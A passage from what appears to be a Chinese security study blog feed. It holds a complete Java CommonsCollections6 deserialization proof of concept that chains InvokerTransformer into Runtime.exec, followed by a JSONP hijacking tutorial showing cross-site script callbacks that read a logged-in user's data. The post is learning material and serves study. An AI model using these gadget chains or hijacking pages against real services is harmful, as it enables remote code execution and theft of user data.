&quot;keykey&quot;);</code></p></li><li><p>将tem作为HashMap的一个key。这样就能调用到hash(key)-&gt;hashcode了。lazyMap那里要用到一个HashMap，因为要继承Serializable接口，这里要用到一个HashMap存放TiedMapEntry的对象</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br></pre></td></tr></table></figure><p>就完事了。但有个问题，expMap.put(tme,”valuevalue”)，put方法也像readObject一样，调用了一遍hash(key)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line"> <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就导致lazyMap被调用了两遍，第一遍是fakeTransformers，第二遍是恶意的transformers。</p><p>faketransformers虽然没有触发命令执行，但是向tme添加了”keykey”的key(hashmap的key需要为”keykey”,不能改键值)，导致第二次没能进入if判断</p><p>画个图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119175745839.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119175745839.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221119175745839"></p><blockquote><p>最后触发命令执行的transformer: key&#x3D;&#x3D;keykey时输出true，不进入循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(map.containsKey(key)==<span class="literal">false</span>)&#123;</span><br><span class="line">        Object value=factory.transform(key);</span><br><span class="line">        map.put(key,value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>解决办法:outerMap.remove(“keykey”)</p><p>完整poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class,Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Object.class,Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);<span class="comment">//先绑定假transform</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        oos.writeObject(expMap);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试图：</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119181540847.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221119181540847.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221119181540847"></p><p>工具推荐：SerializationDumper  16进制序列化内容转字符串</p><p>ysoserial  用户根据自己的利用链生成反序列化数据</p><p> 由于是阅读p神的《java安全漫谈》学习的，那帮P神做个宣传吧。文章或许有许多错误，请指正</p><blockquote><p>我正在「代码审计」和朋友们讨论有趣的话题，你⼀起来吧？<br><a href="https://t.zsxq.com/08Yb">https://t.zsxq.com/08Yb</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSONP劫持</title>
      <link href="/2022/08/18/jsonp-jie-chi/"/>
      <url>/2022/08/18/jsonp-jie-chi/</url>
      
        <content type="html"><![CDATA[<h1 id="JSONP概念"><a href="#JSONP概念" class="headerlink" title="JSONP概念"></a>JSONP概念</h1><p>JSONP&#x3D;JSON with padding</p><p>JSONP实现跨域请求，就是动态创建<code>&lt;script&gt;</code>标签</p><p>先看一个动态创建<code>&lt;script&gt;</code>的简述：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">script.<span class="property">src</span> = <span class="string">&quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">insertBefore</span>(script,<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstChild</span>);</span><br></pre></td></tr></table></figure><p>先创建script标签，然后定义src，添加至标签属性。src指向的就是回调位置</p><h2 id="跨域测试"><a href="#跨域测试" class="headerlink" title="跨域测试"></a>跨域测试</h2><p>先在本地用phpstudy测试一下，1.html的内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            type : <span class="string">&quot;get&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            url : <span class="string">&quot;http://localhost/godown.php?id=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,<span class="comment">//指定我们的请求是一个 jsonp 的请求</span></span></span><br><span class="line"><span class="language-javascript">            success : <span class="keyword">function</span>(<span class="params">data</span>) &#123;<span class="comment">//success 指定的是默认的回调函数</span></span></span><br><span class="line"><span class="language-javascript">                <span class="title function_">jsonhandle</span>(data);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type:application/json; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(<span class="string">&#x27;age&#x27;</span>=&gt;<span class="number">19</span>,<span class="string">&#x27;name&#x27;</span>=&gt;<span class="string">&#x27;jianshu&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果不受同源策略约束，访问1.html时会弹窗。</p><p>但是结果返回了无Access-Control-Allow-Origin值，阻止了跨域访问。因为来自script标签内的get请求 和 godown.php 不同源</p><p>虽然浏览器受到了同源策略约束，但是在开发过程跨域请求几乎是必须用到。</p><p>但是仍有办法，在html中，<code>&lt;img&gt;</code>的src、<code>&lt;link&gt;</code>的href和<code>&lt;script&gt;</code>的src，都可以无视同源策略，原因也很简单，这几个标签的src一般都要指向外链</p><p>所以在&lt;script&gt;的src直接指向js文件即可访问：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/remote.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>remote.js:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">jsonhandle</span>(&#123;</span><br><span class="line">    <span class="string">&quot;age&quot;</span> : <span class="number">15</span>,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>远程js不需要script标签。还能直接使用1.html定义的函数</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212195553076.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212195553076.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221212195553076"></p><h2 id="jsonp测试"><a href="#jsonp测试" class="headerlink" title="jsonp测试"></a>jsonp测试</h2><p>1.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> url = <span class="string">&quot;http://localhost/godown.php?id=1&amp;callback=jsonhandle&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> obj = $(<span class="string">&#x27;&lt;script&gt;&lt;\/script&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        obj.<span class="title function_">attr</span>(<span class="string">&quot;src&quot;</span>,url);</span></span><br><span class="line"><span class="language-javascript">        $(<span class="string">&quot;body&quot;</span>).<span class="title function_">append</span>(obj);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样的定义一个jsonhandle函数，同样的把url放进script标签的src属性，然后放进html的body部分。不同的是godown.php接收callback参数，等于调用jsonhandle函数</p><p>godown.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">20</span>,</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;dada&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&quot;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>).<span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212200329246.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212200329246.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221212200329246"></p><p>jsonp和远程调用remote.js有什么区别？其实就是加了个callback回调参数</p><p>利用jquery库可以更方便的跨域：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>GoJSONP<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">jsonhandle</span>(<span class="params">data</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;age:&quot;</span> + data.<span class="property">age</span> + <span class="string">&quot;name:&quot;</span> + data.<span class="property">name</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    $(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        $.<span class="title function_">ajax</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">            type : <span class="string">&quot;get&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            url : <span class="string">&quot;http://localhost/godown.php?id=1&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">jsonp</span>:<span class="string">&quot;callback&quot;</span>, <span class="comment">//指定回调函数在 URL 中的参数名(不指定默认为 callback)</span></span></span><br><span class="line"><span class="language-javascript">            <span class="attr">jsonpCallback</span>: <span class="string">&quot;jsonhandle&quot;</span>,<span class="comment">//指定回调函数名称(如果不指定，服务器会随机分配一个jQueryxxx 的名字)</span></span></span><br><span class="line"><span class="language-javascript">            success : <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">info</span>(<span class="string">&quot;调用success&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时发出的get请求等于：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/godown.php?id=1&amp;callback=jsonhandle</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212203153709.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221212203153709.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221212203153709"></p><h1 id="JSONP攻击"><a href="#JSONP攻击" class="headerlink" title="JSONP攻击"></a>JSONP攻击</h1><h2 id="jsonp跨域劫持"><a href="#jsonp跨域劫持" class="headerlink" title="jsonp跨域劫持"></a>jsonp跨域劫持</h2><p>jsonp劫持就是攻击者获取了本该传给本网站其他接口的数据。就比如上面的例子，向有漏洞的godown.php发送jsonp请求，php不经过检测就执行了错误的函数。但是godown.php通常是用来返回数据，利用JSONP能非法获取用户数据</p><h2 id="jsonp跨域劫持示例"><a href="#jsonp跨域劫持示例" class="headerlink" title="jsonp跨域劫持示例"></a>jsonp跨域劫持示例</h2><p>1）用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息；<br>2）用户通过浏览器向网站A发出URL请求；<br>3）网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Callback</span>(<span class="params">result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_">alert</span>(result.<span class="property">name</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://B.com/user?jsonp=Callback&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>4）用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求；<br>5）网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Callback</span>(&#123;<span class="string">&quot;id&quot;</span>:<span class="number">1</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;test&quot;</span>,<span class="string">&quot;email&quot;</span>:<span 